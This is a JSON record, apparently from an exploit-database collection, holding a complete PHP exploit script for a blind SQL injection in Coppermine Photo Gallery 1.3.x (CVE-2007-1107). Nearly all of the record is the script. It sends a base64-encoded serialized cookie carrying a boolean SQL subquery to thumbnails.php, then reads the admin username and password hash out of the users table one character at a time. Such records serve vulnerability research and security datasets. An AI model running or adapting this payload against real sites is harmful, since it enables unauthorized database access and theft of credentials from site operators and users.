{
  "id": "3371",
  "title": "Coppermine Photo Gallery 1.3.x - Blind SQL Injection",
  "cve": "CVE-2007-1107",
  "vuln_type": "sqli",
  "code": "<?\r\n# Coppermine Photo Gallery 1.3.x Blind SQL Injection Exploit\r\n# by s0cratex, RTM Member\r\n# Visit: www.zonartm.org\r\n\r\n/*\r\nYou need make a small work... Add a fav pic, enter to the site and add\r\n/addfav.php?pid=2 for example..xD\r\n... in the line: if(eregi(\"download\",fgets($cnx2))){ $pass.=chr($i); echo\r\nchr($i); break; }  }\r\nthe word \"download\" depends of the language...\r\n*/\r\n\r\n# saludos a rgod, OpTix, crypkey 'n mechas...\r\n\r\nerror_reporting(0);\r\nini_set(\"max_execution_time\",0);\r\nini_set(\"default_socket_timeout\",5);\r\n\r\n$host = \"localhost\"; $path = \"/cpg\"; $port = \"80\";\r\n$id = \"1\";\r\n\r\necho \"Coppermine Photo Gallery 1.3.x fav Blind SQL Injection Exploit\\n\";\r\necho \"--------------------------------------------------------------\\n\";\r\necho \"\\n\";\r\necho \"Username -> \";\r\n$j = 1; $user = \"\";\r\nwhile(!strstr($user,chr(0))){\r\nfor($x=0;$x<255;$x++){\r\n$xpl = \"'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_name,\".$j.\",1))=\".$x.\"),1,0)) FROM cpg131_users WHERE user_id=\".$id.\")/*\";\r\n$xpl = \"a:1:{i:0;s:\".strlen($xpl).\":\\\"\".$xpl.\"\\\";}\";\r\n$xpl = base64_encode($xpl);\r\n$cnx = fsockopen($host,$port);\r\nfwrite($cnx, \"GET \".$path.\"/thumbnails.php?album=favpics HTTP/1.0\\r\\nCookie: cpg131_fav=\".$xpl.\"\\r\\n\\r\\n\");\r\nwhile(!feof($cnx)){\r\nif(eregi(\"download\",fgets($cnx))){ $user.=chr($x); echo chr($x); break; }  }\r\nfclose($cnx);\r\nif ($x==255) {\r\ndie(\"\\n Try again...\"); }\r\n}\r\n$j++;\r\n}\r\necho \"\\n\";\r\necho \"Password -> \";\r\n$a = 1; $pass = \"\";\r\nwhile(!strstr($pass,chr(0))){\r\nfor($i=0;$i<255;$i++){\r\n$xpl = \"'') OR 1=(SELECT (IF((ASCII(SUBSTRING(user_password,\".$a.\",1))=\".$i.\"),1,0)) FROM cpg131_users WHERE user_id=\".$id.\")/*\";\r\n$xpl = \"a:1:{i:0;s:\".strlen($xpl).\":\\\"\".$xpl.\"\\\";}\";\r\n$xpl = base64_encode($xpl);\r\n$cnx2 = fsockopen($host,$port);\r\nfwrite($cnx2, \"GET \".$path.\"/thumbnails.php?album=favpics HTTP/1.0\\r\\nCookie: cpg131_fav=\".$xpl.\"\\r\\n\\r\\n\");\r\nwhile(!feof($cnx2)){\r\nif(eregi(\"download\",fgets($cnx2))){ $pass.=chr($i); echo chr($i); break; }\r\n}\r\nfclose($cnx2);\r\nif ($i==255) {\r\ndie(\"\\n Try again...\"); }\r\n}\r\n$a++;\r\n}\r\necho \"--------------------------------------------------------------\\n\";\r\necho \"s0cratex@zonartm.org || if you speak spanish->MSN: s0cratex@hotmail.com ..xD\\n\";\r\necho \"www.zonartm.org/blog/s0cratex\\n\";\r\necho \"plexinium.com comming soon <- Hacking Nica\\n\";\r\n?>\r\n\r\n# milw0rm.com [2007-02-24]",
  "url": "https://www.exploit-db.com/exploits/3371"
}